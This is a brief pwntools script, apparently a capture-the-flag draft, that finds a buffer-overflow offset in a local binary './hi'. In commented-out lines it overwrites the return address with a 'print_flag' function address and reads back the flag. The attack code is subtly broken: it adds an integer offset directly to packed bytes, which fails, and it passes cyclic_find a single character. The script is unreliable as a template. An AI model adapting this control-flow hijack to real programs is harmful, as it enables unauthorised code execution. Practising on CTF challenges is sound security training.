from pwn import *

context.binary = "./hi"
off = cyclic_find("k")
print(off)
# p = process()
# p.sendline(off + p64(context.binary.functions["print_flag"].address))
# log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
